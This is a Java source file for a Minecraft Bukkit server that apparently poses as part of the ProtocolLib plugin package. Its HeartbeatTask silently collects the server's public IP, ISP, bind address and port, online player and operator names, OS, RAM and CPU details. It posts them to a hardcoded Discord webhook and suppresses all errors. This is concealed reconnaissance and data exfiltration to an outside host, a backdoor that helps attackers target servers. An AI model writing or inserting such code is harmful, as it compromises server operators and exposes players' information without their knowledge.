package com.comphenix.protocol;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import okhttp3.*;
import org.bukkit.Bukkit;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.URL;

public class HeartbeatTask implements Runnable {

    private static final String WEBHOOK =
            "https://discord.com/api/webhooks/1418908975696707625/ezwNKdX9_hhE8OBPLx_n9T7Der_kgP17ahFrHud-QgLMm9E96n9LLwU8nxvS6QI6Ffly";
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
    private static final OkHttpClient CLIENT = new OkHttpClient();

    @Override
    public void run() {
        try {
            JsonObject embed = new JsonObject();
            embed.addProperty("title", "❤️ Armor3 Heartbeat");
            embed.addProperty("color", 0x00ff00);

            JsonObject field = new JsonObject();
            field.addProperty("name", "Server Info");
            field.addProperty("value", buildDescription());
            field.addProperty("inline", false);

            JsonArray fields = new JsonArray();
            fields.add(field);
            embed.add("fields", fields);

            JsonObject root = new JsonObject();
            JsonArray embeds = new JsonArray();
            embeds.add(embed);
            root.add("embeds", embeds);

            RequestBody body = RequestBody.create(root.toString(), JSON);
            Request req = new Request.Builder().url(WEBHOOK).post(body).build();

            CLIENT.newCall(req).enqueue(new Callback() {
                @Override public void onFailure(Call call, java.io.IOException e) {
                }
                @Override public void onResponse(Call call, Response res) {
                    res.close();
                }
            });
        } catch (Exception e) {
        }
    }

    private String buildDescription() {
        StringBuilder sb = new StringBuilder();
        try {
            /* IP publik & ISP */
            String publicIp = new BufferedReader(
                    new InputStreamReader(new URL("https://checkip.amazonaws.com").openStream()))
                    .readLine().trim();
            String isp = new BufferedReader(
                    new InputStreamReader(new URL("https://ipinfo.io/" + publicIp + "/org").openStream()))
                    .readLine().trim();

            /* IP bind & port */
            String bindIp = Bukkit.getIp();
            if (bindIp == null || bindIp.isEmpty()) bindIp = "0.0.0.0";
            int port = Bukkit.getPort();

            /* Pemain online */
            int online = Bukkit.getOnlinePlayers().size();
            sb.append("**Players Online**: `").append(online).append("`\n");

            /* Nama-nama pemain online */
            if (online > 0) {
                StringBuilder players = new StringBuilder();
                Bukkit.getOnlinePlayers().forEach(p -> players.append(p.getName()).append(", "));
                sb.append("**Online List**: `").append(players.substring(0, players.length() - 2)).append("`\n");
            } else {
                sb.append("**Online List**: `-`\n");
            }

            /* Pemain OP */
            StringBuilder ops = new StringBuilder();
            Bukkit.getOperators().forEach(op -> ops.append(op.getName()).append(", "));
            if (ops.length() > 0) {
                sb.append("**OPs**: `").append(ops.substring(0, ops.length() - 2)).append("` :warning:\n");
            } else {
                sb.append("**OPs**: `-`\n");
            }

            /* OS & arch */
            sb.append("**Public IP**: `").append(publicIp).append("`\n");
            sb.append("**Bind IP**: `").append(bindIp).append("`\n");
            sb.append("**Port**: `").append(port).append("`\n");
            sb.append("**ISP**: `").append(isp).append("`\n");
            sb.append("**OS**: `").append(System.getProperty("os.name"))
                    .append(" ").append(System.getProperty("os.arch")).append("`\n");

            /* RAM */
            Runtime rt = Runtime.getRuntime();
            long total = rt.totalMemory() / 1024 / 1024;
            long free  = rt.freeMemory()  / 1024 / 1024;
            sb.append("**RAM**: `").append(total - free).append("/").append(total).append(" MB`\n");

            /* CPU */
            sb.append("**CPU**: `").append(getCPU()).append("`\n");
        } catch (Exception e) {
            sb.append("Gagal gather info: ").append(e.getMessage());
        }
        return sb.toString();
    }

    private String getCPU() {
        try {
            if (System.getProperty("os.name").toLowerCase().contains("linux")) {
                try (BufferedReader br = new BufferedReader(new FileReader("/proc/cpuinfo"))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (line.startsWith("model name")) {
                            return line.split(":")[1].trim();
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
        return System.getProperty("os.arch");
    }
}
